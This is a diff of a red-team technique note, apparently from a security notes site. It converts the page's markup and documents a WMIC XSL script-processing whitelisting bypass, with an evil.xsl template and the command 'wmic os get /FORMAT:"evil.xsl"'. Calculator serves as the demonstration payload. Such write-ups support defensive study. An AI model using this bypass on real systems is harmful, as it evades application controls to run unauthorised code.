@@ -2,16 +2,16 @@
 
 Another application whitelist bypassing technique discovered by Casey @subTee, similar to squiblydoo:
 
-{% content-ref url="t1117-regsvr32-aka-squiblydoo.md" %}
+
 [t1117-regsvr32-aka-squiblydoo.md](t1117-regsvr32-aka-squiblydoo.md)
-{% endcontent-ref %}
+
 
 ## Execution
 
 Define the XSL file containing the jscript payload:
 
-{% code title="evil.xsl" %}
 ```csharp
+// evil.xsl
 <?xml version='1.0'?>
 <stylesheet
 xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
@@ -24,25 +24,23 @@ version="1.0">
 	]]> </ms:script>
 </stylesheet>
 ```
-{% endcode %}
 
 Invoke any wmic command now and specify /format pointing to the evil.xsl:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 wmic os get /FORMAT:"evil.xsl"
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-10 22-05-24.png>)
+![[Screenshot from 2019-04-10 22-05-24.png]]
 
 ## Observation
 
 Calculator is spawned by svchost.exe:
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-10 21-57-52.png>)
+![[Screenshot from 2019-04-10 21-57-52.png]]
 
 ## References
 
-{% embed url="http://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html" %}
+[subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html](http://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html)
 
